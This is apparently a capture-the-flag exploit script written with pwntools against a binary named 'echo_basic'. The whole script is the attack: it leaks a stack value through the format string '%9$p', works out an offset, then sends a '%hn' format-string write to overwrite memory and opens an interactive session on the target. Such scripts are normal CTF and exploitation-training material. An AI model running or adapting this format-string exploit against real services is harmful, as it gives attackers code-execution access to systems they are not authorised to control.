from pwn import *
import sys
exe = ELF("echo_basic")

context.binary = exe

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            util.proc.wait_for_debugger(util.proc.pidof(r)[0])
    else:
        r = remote("rua_host_goes_here", 1337)
    return r


io = start()
io.recv()
io.sendline(b"%9$p")
ovo = int(io.recvuntil(b"00000064\n")[:2+8],16)
owo = ovo - 0x1337
log.info("ovo=0x%x\nowo=0x%x" % (ovo,owo))
if ((ovo & 0xffff) != ((owo & 0xffff) + 0x1337)):
    log.warn("value not match, try again")
    sys.exit(0)
io.sendline(f'%{owo& 0xffff}x%11$hnAAAA'.encode())
io.recvuntil(b"AAAA")
io.interactive()